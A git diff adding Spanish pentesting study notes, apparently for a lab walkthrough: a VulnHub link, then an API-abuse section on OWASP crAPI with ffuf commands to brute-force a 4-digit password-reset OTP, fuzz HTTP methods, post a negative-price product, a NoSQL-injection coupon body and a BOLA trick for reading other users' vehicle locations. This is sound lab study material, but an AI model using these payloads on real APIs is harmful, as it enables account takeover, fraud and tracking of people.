@@ -807,6 +807,8 @@ if __name__ == "__main__":
 
 ```
 # 14. [[deserialization attack]]
+-  **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)
+
 arp-scan -I eno2 --localnet --ignoredups -> *para escanear ip's en la interface eno2*
 
 **nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.103 -oG allports**
@@ -885,3 +887,36 @@ se puede leer una linea de un archivo con el siguiente codigo de latex:
 \closein\file
 ```
 entonces construyo script de bash para que me muestre todas las lineas de una archivo que le indique
+
+# 16. abuso de apis
+- **crAPI**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
+
+la vulnerabilidad esta en la funcion de recuperar contrasena, que envia un OTP de 4 digitos que se puede crackear con fuerza bruta porque la API no tiene rate limiting
+
+se prueba en la api V2, porque no tiene rate limiting en el endpoint de check-otp
+
+fuzzing:
+ffuf -u http://localhost:8888/identity/api/auth/v2/check-otp -w /usr/share/seclists/Fuzzing/4-digits... -X POST -d "datos del payload {"orp":"FUZZ"}" -p 1 -mc 200
+
+- -p hace que tenga demora de 1 segundo
+- -mc 200 es la respuesta HTTP deseada
+
+hay un diccionario de seclist que lista metodos http (http methods)
+
+ffuf -u http://localhost:8888/workshop/api/auth/shop/products -w /usr/share/seclists/Fuzzing/http-request-methods -X FUZZ -p 1
+- esto muestra que esta ruta se puede usar con distintos metodos http
+- se le puede agregar -mc 401,200
+- devuelve HEAD, GET, POST, OPTIONS
+- osea se puede usar POST en este endpoint, permite agregar productos
+
+se le puede pasar un body con un precio negativo
+{"name": "hacked","price": "-10000", "image_url": ""}
+
+ademas se puede hacer [[no-sql injection]] en el codigo de coupon con este body:
+{"coupon_code": {"$ne": "1"}}
+
+BOLA (broken object level authorization)
+en el endpoint para localizar vehiculo puedo ver la localizacion de otros autos cambiando el id, sin auth
+- en las response de "community" en cada mensaje mostrado se muestra informacion del usuario como el vehicleID, que luego sirve para usarlo en el localizador de vehiculo
+
+# 17. abuso de subidas de archivos
